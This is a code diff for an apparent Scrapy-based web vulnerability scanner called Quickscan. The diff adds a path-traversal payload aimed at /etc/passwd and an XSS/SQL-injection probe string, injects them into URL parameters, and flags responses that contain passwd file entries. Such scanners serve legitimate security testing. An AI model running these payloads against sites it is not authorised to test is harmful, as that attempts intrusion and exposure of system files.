@@ -6,7 +6,8 @@ from scrapy.http import FormRequest, Request
 from scrapy.selector import Selector
 #from quickscan.items import injected_resp
 #from quickscan.loginform import fill_login_form
-from urlparse import urlparse, parse_qsl, urljoin
+from urlparse import urlparse, parse_qsl, urljoin, urlunparse, urlunsplit
+from urllib import urlencode
 
 from scrapy.http.cookies import CookieJar
 from cookielib import Cookie
@@ -37,6 +38,10 @@ class Quickscan(CrawlSpider):
         Handles args and logging in
         """
         super(Quickscan, self).__init__(*args, **kwargs)
+
+        self.lfi_fuzz = '/../../../../../../../../../../../../../../../etc/passwd'
+        self.xss_sqli_str = '\'"(){}<x>:/'
+
         self.start_urls = [kwargs.get('url')]
         hostname = urlparse(self.start_urls[0]).hostname
         # With subdomains
@@ -63,6 +68,7 @@ class Quickscan(CrawlSpider):
 
         # Determine whether we payload all inputs in 1 request or multi
         # By default (without --fast arg), payload inputs 1 per req
+        # self.fast = either str 'False' or str 'True'
         self.fast = kwargs.get('fast')
 
     def parse_start_url(self, response):
@@ -209,39 +215,156 @@ class Quickscan(CrawlSpider):
         """
         Get all the input vectors: params, end of url, forms, headers
         """
-        parsed_url = urlparse(orig_url)
         reqs = []
+        parsed_url = urlparse(orig_url)
+        # parse_qsl rather than parse_qs in order to preserve order
+        # will always return a list
+        url_params = parse_qsl(parsed_url.query)
 
-        url_params = self.get_url_params(parsed_url)
-        # If no params, then we can test the end of the URL
-        # WORK: just add a %s on to end_of_url and it's ready to be payloaded
-        if url_params is not None:
-            if orig_url.endswith('/'):
-                end_of_url = orig_url
-            else:
-                end_of_url = orig_url + '/'
-            # If there are params and we still want to test end of URL minus the params
-            #            scheme                  netloc          path
-            #end_of_url = parsed_url[0] + '://' + parsed_url[1] + parsed_url[2]
+
+        # Make the payloaded URLs based on parameters
+        # url = payloaded_urls[0]
+        # modified params = payloaded_urls[1]
+        # payload = payloaded_urls[2]
+        if len(url_params) > 0:
+            payloaded_urls = self.make_urls(parsed_url, url_params)
+
+        # If no params, then we can payload the end of the URL
+        else:
+            payloaded_urls = self.payload_end_of_url(orig_url)
 
         form_data = self.get_form_params(orig_url, parsed_url, doc)
-        if form_data is not None:
-            for form in form_data:
-                print 'FORM:', form
+#        if form_data is not None:
+#            for form in form_data:
+#                print 'FORM:', form
 
         #headers = ... user-agent, referer, shellshock, cookies
 
-#        if fast not None:
-#            # put all the inputs into one request
-#            pass
-#        else:
-#            # make one request per input
-#            pass
-        #{'urls':[urls], 'headers':
-        print 'URL PARAMS:', url_params
-        print ''
+        callback = self.lfi_analyzer ########################################
+
+        # Create the payloaded URL requests
+        url_reqs = self.make_url_reqs(payloaded_urls, orig_url, callback)
+        reqs += url_reqs
+
         if len(reqs) > 0:
             return reqs
+
+    def lfi_analyzer(self, response):
+        meta = response.meta
+        payload = meta['payload']
+        params = meta['params']
+        location = meta['location']
+        orig_url = meta['orig_url']
+        resp_url = response.url
+        body = response.body
+
+        file_patterns = ["root:x:0:0:", "daemon:x:1:1:", ":/bin/bash", ":/bin/sh"]
+        for fp in file_patterns:
+            if fp in body:
+                print '\n\n\n                 LFI in %s, original URL: %s\n\n\n' % (params, orig_url)
+
+    def make_url_reqs(self, payloaded_urls, orig_url, callback):
+        """
+        Create the payloaded URL requests
+        """
+        reqs = [Request(url,
+                        meta={'location':'url',
+                              'params':params,
+                              'orig_url':orig_url,
+                              'payload':payload},
+                        callback = callback)
+                        for url, params, payload in payloaded_urls]
+
+        if len(reqs) > 0:
+            return reqs
+
+    def payload_end_of_url(self, orig_url):
+        """
+        Return a URL with the end of it payloaded
+        """
+        payload = self.lfi_fuzz
+
+        if orig_url.endswith('/'):
+            payloaded_url = orig_url + payload
+        else:
+            payloaded_url = orig_url + '/' + payload
+
+               # url            # param       # payload
+        return [(payloaded_url, 'end of URL', payload)]
+        # If there are params and we still want to test end of URL minus the params
+        #            scheme                  netloc          path
+        #end_of_url = parsed_url[0] + '://' + parsed_url[1] + parsed_url[2]
+
+    def make_urls(self, parsed_url, url_params):
+        """
+        Create the URL parameter payloaded URLs
+        """
+        payloaded_urls = []
+
+        # Payload all URL params in 1 URL
+        if self.fast == 'True':
+            new_query_strings = self.get_multipayload_query(url_params)
+        # Create 1 URL per payloaded param
+        else:
+            new_query_strings = self.get_single_payload_queries(url_params)
+
+        for query in new_query_strings:
+            query_str =  query[0]
+            params = query[1]
+            payload = query[2]
+                                       # scheme       #netlo         #path          #params        #query (url params) #fragment
+            payloaded_url = urlunparse((parsed_url[0], parsed_url[1], parsed_url[2], parsed_url[3], query_str, parsed_url[5]))
+            payloaded_urls.append((payloaded_url, params, payload))
+
+        if len(payloaded_urls) > 0:
+            return payloaded_urls
+
+    def get_multipayload_query(self, url_params):
+        """
+        --fast arg triggers this
+        Make single URL with all parameters payloaded
+        """
+        all_params = []
+        payload = self.lfi_fuzz
+        payloaded_params = []
+        for p in url_params:
+            param, value = p
+            all_params.append(param)
+            payloaded_params.append((param, payload))
+        payloaded_query_str = urlencode(payloaded_params, doseq=True)
+        return [(payloaded_query_str, ', '.join(all_params), payload)]
+
+    def get_single_payload_queries(self, url_params):
+        """
+        Make a list of lists of tuples where each secondary list has 1 payloaded
+        param and the rest are original value
+        """
+        new_payloaded_params = []
+        changed_params = []
+        modified = False
+        payload = self.lfi_fuzz
+        # Create a list of lists where num of lists = len(params)
+        for x in xrange(0, len(url_params)):
+            single_url_params = []
+            for p in url_params:
+                param, value = p
+                # if param has not been modified and we haven't changed a parameter for this loop
+                if param not in changed_params and modified == False:
+                    new_param_val = (param, payload)
+                    single_url_params.append(new_param_val)
+                    changed_params.append(param)
+                    modified = param
+                else:
+                    single_url_params.append(p)
+
+            # Add the modified, urlencoded params to the master list
+            new_payloaded_params.append((urlencode(single_url_params), modified, payload))
+            # Reset the changed parameter tracker
+            modified = False
+
+        if len(new_payloaded_params) > 0:
+            # [(payloaded params, payloaded param, payload), (payloaded params, payloaded param, payload)]
+            return new_payloaded_params
 
     def get_form_params(self, orig_url, parsed_url, doc):
         """
@@ -318,15 +441,6 @@ class Quickscan(CrawlSpider):
         else:
             return post_url
 
-    def get_url_params(self, parsed_url):
-        """
-        Get the URL parameters
-        """
-        full_params = parsed_url.query
-        params = parse_qsl(full_params) #parse_qsl rather than parse_ps in order to preserve order
-        if len(params) > 0:
-            return params
-
     def html_parser(self, html, orig_url):
         try:
             # soupparser will handle broken HTML better (like identical attributes) but god damn will you pay for it
@@ -337,5 +451,3 @@ class Quickscan(CrawlSpider):
             self.log('ParserError from lxml on %s' % orig_url)
         except lxml.etree.XMLSyntaxError:
             self.log('XMLSyntaxError from lxml on %s' % orig_url)
-
-
